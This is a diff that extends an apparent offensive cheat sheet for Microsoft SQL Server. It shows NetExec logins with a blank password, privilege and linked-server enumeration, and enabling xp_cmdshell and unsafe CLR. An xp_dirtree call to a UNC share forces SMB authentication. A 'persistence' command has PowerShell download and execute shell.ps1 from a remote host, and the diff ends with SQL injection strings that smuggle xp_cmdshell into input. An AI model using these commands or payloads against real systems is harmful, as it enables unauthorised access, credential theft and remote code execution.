@@ -3,4 +3,69 @@ nxc mssql 10.10.10.52 -u admin -p '' --local-auth -q 'SELECT * FROM sys.database
 nxc mssql 10.10.10.52 -u admin -p '' --local-auth -q 'SELECT * FROM master.dbo.sysdatabases;'
 # impacket-mssqlclient admin@10.10.10.10 -windows-auth
 # USE something; GO
-# SELECT name FROM sys.tables;
+# SELECT name FROM sys.tables; -- all databases
+# SELECT SYSTEM_USER;          -- Windows login if using Windows auth
+# SELECT SUSER_NAME();         -- SQL Server login
+# SELECT USER_NAME();          -- Database user
+# SELECT IS_SRVROLEMEMBER('sysadmin'); -- sysadmin?
+# SELECT * FROM sys.server_role_members; -- server roles / permissions
+# SELECT * FROM sys.server_permissions;
+# SELECT * FROM sys.servers; -- linked servers (potential lateral movement)
+#
+#
+#  ---------------------------------------------------------------------- classic Extended Stored Procedures (xp_* family)
+#
+# SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'; -- advanced options (sysadmin required)
+# EXEC sp_configure 'show advanced options', 1;
+# RECONFIGURE;
+#
+# EXEC sp_configure 'xp_cmdshell', 1; -- xp_cmdshell
+# RECONFIGURE;
+#
+# EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\MSSQLServer\MSSQLServer','SQLDataRoot'; -- registry read
+# EXEC master..xp_fileexist 'C:\Windows\win.ini';    -- dir listing
+# EXEC master..xp_dirtree '\\your-ip\share\test';     -- triggers SMB auth attempt
+#
+#  ---------------------------------------------------------------------- persistence 
+#
+# EXEC xp_cmdshell 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://ip/shell.ps1'')"';   
+#
+# ---------------------------------------------------------------------- CLR Integration (the .NET-powered feature)
+#
+# SELECT value_in_use FROM sys.configurations WHERE name = 'clr enabled'; --check
+#
+# EXEC sp_configure 'show advanced options', 1; -- enable
+# RECONFIGURE;
+# EXEC sp_configure 'clr enabled', 1;
+# RECONFIGURE;
+# EXEC sp_configure 'clr strict security', 0; -- optional: allow unsafe assemblies (very dangerous)
+# RECONFIGURE;
+#
+# 
+# SELECT * FROM sys.assemblies; -- existing CLR procedures
+# SELECT * FROM sys.procedures WHERE type_desc = 'CLR_STORED_PROCEDURE';
+# CREATE PROCEDURE dbo.runcmd @command NVARCHAR(4000)  -- Example creation syntax (after importing assembly)
+# AS EXTERNAL NAME [YourAssemblyName].[YourNamespace.StoredProcedures].RunCommand;
+# EXEC dbo.runcmd 'whoami';  -- Then call it
+# 
+#
+#
+#  ---------------------------------------------------------------------- house keeping
+#
+# -- disable xp_cmdshell again
+# EXEC sp_configure 'xp_cmdshell', 0;
+# RECONFIGURE;
+# -- disable CLR
+# EXEC sp_configure 'clr enabled', 0;
+# RECONFIGURE;
+# -- drop test procedure / assembly
+# DROP PROCEDURE dbo.runcmd;
+# DROP ASSEMBLY [YourAssemblyName];
+# 
+#
+#  ---------------------------------------------------------------------- easy manual injection 
+# 
+#'; EXEC xp_cmdshell 'whoami' -- 
+#'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami' --
+#'; WAITFOR DELAY '0:0:5' --
+#' UNION SELECT @@version --
